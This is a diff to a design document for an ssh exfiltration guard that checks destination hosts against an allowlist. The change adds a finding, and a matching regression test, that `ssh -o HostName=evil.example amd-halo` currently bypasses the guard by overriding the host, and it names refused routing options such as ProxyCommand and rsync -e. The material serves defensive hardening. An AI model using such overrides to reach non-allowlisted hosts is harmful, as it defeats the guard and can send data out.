@@ -123,19 +123,32 @@ hosts actually checked.
 
 ### Faithful resolution and its options
 
-`ssh -G` honours the same config-selecting options the real command would, so for
-fidelity the resolver passes through the ssh options that affect which host config
-applies — notably `-F <configfile>` and host-affecting `-o` settings already
-collected in `options` by `_ssh_positionals` — while never passing through an
-option that could itself route the session (`-o ProxyCommand=`/`ProxyJump=` are
-already refused before resolution, so they never reach the resolver). scp/sftp use
-`-F`/`-o` with the same meaning; rsync's transport-substituting `-e`/`--rsh` and
-`RSYNC_RSH` are already refused upstream, so rsync-over-ssh destinations reach the
-resolver as plain `[user@]host:path` specs.
+`ssh -G` honours the same config-selecting options the real command would, so the
+resolver must pass through the ssh options that affect which host config applies —
+notably `-F <configfile>` and host-affecting `-o` settings already collected in
+`options` by `_ssh_positionals` — while never passing through an option that could
+itself route the session (`-o ProxyCommand=`/`ProxyJump=` are already refused before
+resolution, so they never reach the resolver). scp/sftp use `-F`/`-o` with the same
+meaning; rsync's transport-substituting `-e`/`--rsh` and `RSYNC_RSH` are already
+refused upstream, so rsync-over-ssh destinations reach the resolver as plain
+`[user@]host:path` specs.
+
+Forwarding the host-affecting `-o` settings is **correctness-critical, not merely a
+fidelity nicety**, because today's literal guard already has a hole that under-
+forwarding would leave open. `_check_ssh_family` matches only the positional host
+token, so `ssh -o HostName=evil.example amd-halo` is **allowed today**: the guard
+checks `amd-halo` (allowlisted), while real ssh — reading the same `-o HostName=` —
+connects to `evil.example`. If the resolver forwards `-o HostName=`/`-o Port=` to
+`ssh -G`, `ssh -G` reports `evil.example` and the guard correctly blocks. A resolver
+that drops those options would resolve under a weaker configuration than the real
+command and preserve the hole. So the forwarded set must cover exactly the
+host/config-selecting options the real command uses, while continuing to refuse the
+routing options (`-o ProxyCommand=`/`ProxyJump=`) before resolution.
 
 The exact set of options to forward to `ssh -G` is a detail to pin down during
 implementation (see open questions); the safe default is to forward `-F` and the
-non-routing `-o` values and nothing else.
+host/config-selecting `-o` values (`HostName`, `Port`, `User`, and the like) and
+nothing that routes the session.
 
 ### Why this is not a new exfiltration vector
 
@@ -170,6 +183,11 @@ A reviewer confirms the task is done when:
   existing "not an allowlisted lab host" reason.
 - An alias whose `ProxyJump` resolves to a non-allowlisted host is **blocked**
   (and, symmetrically, a `ProxyCommand`-bearing alias is blocked as unverifiable).
+- `ssh -o HostName=evil.example amd-halo`, where the command line overrides the
+  resolved host to a non-allowlisted one, is **blocked** — the host/config-selecting
+  `-o` option is forwarded to `ssh -G`, so the guard checks `evil.example`, not the
+  positional `amd-halo`. (This case is **allowed** on the base branch, so it is the
+  regression test for the forwarding requirement in open question #1.)
 - When `ssh -G` fails (fake ssh exits non-zero, or ssh is absent), the guard falls
   back to a literal match: an allowlisted literal (`ssh amd-halo`) is still
   allowed and a non-allowlisted literal (`ssh evil.example`) is still blocked —
@@ -208,10 +226,13 @@ network tests). CI runs all `test_exfiltration_guard_*.py` modules via
 ## Open questions
 
 1. **Which ssh options to forward to `ssh -G`.** The safe default is `-F` and the
-   non-routing `-o` values. Forwarding more risks surprising interactions;
-   forwarding less risks resolving under a different config than the real command.
-   The implementer should settle this against the `_SSH_VALUE_FLAGS` set and note
-   the decision in the resolver's docstring.
+   host/config-selecting `-o` values. The asymmetry is not symmetric in risk:
+   forwarding more risks surprising interactions, but forwarding *less* leaves the
+   `-o HostName=` hole described under "Faithful resolution" open — a real
+   correctness/security gap, not merely resolution under a different config. The
+   implementer should settle the exact set against the `_SSH_VALUE_FLAGS` set,
+   confirm `HostName`/`Port` are among those forwarded, and note the decision in the
+   resolver's docstring.
 2. **ProxyJump recursion depth.** One level of resolution (resolve the alias, then
    resolve each named jump hop once) covers the reported need and the task's four
    cases. A jump host that is itself defined only via a further ProxyJump chain is
